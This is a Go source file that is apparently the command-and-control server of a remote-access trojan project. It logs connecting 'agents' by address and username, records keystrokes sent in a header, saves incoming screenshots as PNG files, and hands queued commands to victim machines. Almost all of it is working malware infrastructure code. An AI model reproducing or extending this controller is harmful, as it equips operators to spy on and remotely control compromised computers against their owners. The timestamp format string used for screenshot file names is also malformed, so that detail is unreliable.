package c2

import (
	"bytes"
	"image"
	"image/png"
	"io"
	"log/slog"
	"net/http"
	"os"
	"time"

	"github.com/hardal7/pex/internal/config"
)

func Serve() {
	root := http.NewServeMux()
	root.Handle("/", http.HandlerFunc(requestHandler()))

	slog.Info("Starting server on port: " + config.Port)
	server := http.Server{
		Addr:    ":" + config.Port,
		Handler: root,
	}
	err := server.ListenAndServe()
	if err != nil {
		slog.Error("Failed to start server: " + err.Error())
	}
}

func requestHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		slog.Info("Connected Agent: \n")
		slog.Info("Address: " + r.RemoteAddr)
		slog.Info("Username: " + r.Header.Get("Username"))
		if r.Header.Get("Keys") != "" {
			slog.Info("Keys Pressed: " + r.Header.Get("Keys"))
		}
		response, err := io.ReadAll(r.Body)
		if err != nil {
			slog.Error("Failed reading request body: " + err.Error())
			return
		}

		if r.Header.Get("Content-Type") == "image/png" {
			slog.Info("Received response with image")
			image, _, _ := image.Decode(bytes.NewReader(response))
			out, _ := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
			defer out.Close()
			png.Encode(out, image)
		} else if string(response) != "" {
			slog.Info("Received response:\n" + string(response))
		} else {
			requestCommand(w)
		}
	}
}

func requestCommand(w http.ResponseWriter) {
	mu.Lock()
	if task.Command != "" {
		w.Write([]byte(task.Command))
		slog.Info("Command requested: " + task.Command)
		task.Command = ""
	} else {
		w.Write([]byte(""))
		slog.Info("Pinged agent")
	}
	mu.Unlock()
}
